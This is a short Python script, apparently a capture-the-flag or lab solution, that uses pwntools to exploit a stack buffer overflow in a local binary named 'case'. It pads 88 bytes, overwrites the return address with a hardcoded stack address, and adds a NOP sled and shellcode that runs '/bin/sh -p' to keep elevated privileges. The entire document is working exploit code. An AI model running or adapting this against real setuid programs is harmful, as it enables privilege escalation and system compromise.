from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

addr = 0x7fffffffecf8

offset = 88
ret = addr + offset

shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh', '-p'], 0))

payload  = b'A' * offset
payload += p64(ret)
payload += b'\x90' * 100
payload += shellcode

p = process(['env', '-i', './case'])
sleep(0.5)
p.sendline(payload)
p.interactive()
